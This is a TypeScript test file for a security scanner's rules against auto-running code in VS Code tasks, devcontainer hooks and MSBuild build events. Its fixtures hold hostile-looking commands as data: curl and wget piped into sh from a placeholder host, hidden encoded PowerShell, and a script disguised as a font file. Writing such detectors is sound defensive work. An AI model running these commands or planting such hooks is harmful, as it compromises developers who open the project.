import { test } from 'node:test';
import assert from 'node:assert/strict';
import { file, only, tasksJson, x } from './helpers.ts';

const folderOpen = (command: string, extra: Record<string, unknown> = {}) =>
  tasksJson([{ label: 'setup', type: 'shell', command, runOptions: { runOn: 'folderOpen' }, ...extra }]);

test('EXEC-001: a folder-open task is High', () => {
  const f = only([file('.vscode/tasks.json', folderOpen('npm run watch'))], 'EXEC-001');
  assert.equal(f.length, 1);
  assert.equal(f[0]?.severity, 'high');
  assert.equal(f[0]?.line, 9);
});

test('EXEC-001: a folder-open task that downloads or runs a disguised file is Critical', () => {
  const dl = only([file('.vscode/tasks.json', folderOpen(x('cu§rl -s https://example.invalid/a | s§h')))], 'EXEC-001');
  assert.equal(dl[0]?.severity, 'critical');
  assert.match(dl[0]?.message ?? '', /downloads from the internet/);
  const font = only([file('.vscode/tasks.json', folderOpen('node public/fonts/brand.woff2'))], 'EXEC-001');
  assert.equal(font[0]?.severity, 'critical');
  assert.match(font[0]?.message ?? '', /disguised/);
});

test('EXEC-001: per-OS overrides are inspected', () => {
  const t = tasksJson([{ label: 'x', command: 'echo ok', windows: { command: x('power§shell -w hid§den -c calc') }, runOptions: { runOn: 'folderOpen' } }]);
  assert.equal(only([file('.vscode/tasks.json', t)], 'EXEC-001')[0]?.severity, 'critical');
});

test('EXEC-001: tasks without folderOpen and other files are ignored', () => {
  assert.equal(only([file('.vscode/tasks.json', tasksJson([{ label: 'build', command: 'make' }]))], 'EXEC-001').length, 0);
  assert.equal(only([file('docs/tasks.json', folderOpen('make'))], 'EXEC-001').length, 0);
});

test('EXEC-001: unparseable tasks.json still reports the auto-run marker', () => {
  const broken = '{ "tasks": [ { "label": "a", "runOptions": { "runOn": "folderOpen" } ] ';
  const f = only([file('.vscode/tasks.json', broken)], 'EXEC-001');
  assert.equal(f.length, 1);
  assert.match(f[0]?.message ?? '', /could not be fully parsed/);
});

test('EXEC-001: tasks inside a .code-workspace file are checked', () => {
  const ws = JSON.stringify({ folders: [], tasks: { version: '2.0.0', tasks: [{ label: 'a', command: 'make', runOptions: { runOn: 'folderOpen' } }] } });
  assert.equal(only([file('project.code-workspace', ws)], 'EXEC-001').length, 1);
});

test('EXEC-002: initializeCommand is High, suspicious content Critical, other hooks ignored', () => {
  assert.equal(only([file('.devcontainer/devcontainer.json', '{ "initializeCommand": "./prepare.sh" }')], 'EXEC-002')[0]?.severity, 'high');
  const bad = JSON.stringify({ initializeCommand: x('wg§et -qO- https://example.invalid/i | s§h') });
  assert.equal(only([file('.devcontainer.json', bad)], 'EXEC-002')[0]?.severity, 'critical');
  assert.equal(only([file('.devcontainer/devcontainer.json', '{ "postCreateCommand": "npm ci" }')], 'EXEC-002').length, 0);
});

test('EXEC-004: build events are Medium, suspicious ones Critical, entities decoded', () => {
  const benign = '<Project><Target Name="A"><Exec Command="dotnet tool restore" /></Target></Project>';
  assert.equal(only([file('app.csproj', benign)], 'EXEC-004')[0]?.severity, 'medium');
  const evil = x('<Project><PropertyGroup><PreBuildEvent>power§shell -w hid§den -enc ') + 'A'.repeat(40) + '</PreBuildEvent></PropertyGroup></Project>';
  const f = only([file('tool.vcxproj', evil)], 'EXEC-004');
  assert.equal(f[0]?.severity, 'critical');
  const encoded = x('<Exec Command="cu§rl -s https://example.invalid/a &#124; s§h" />');
  assert.equal(only([file('Directory.Build.targets', encoded)], 'EXEC-004')[0]?.severity, 'critical');
});
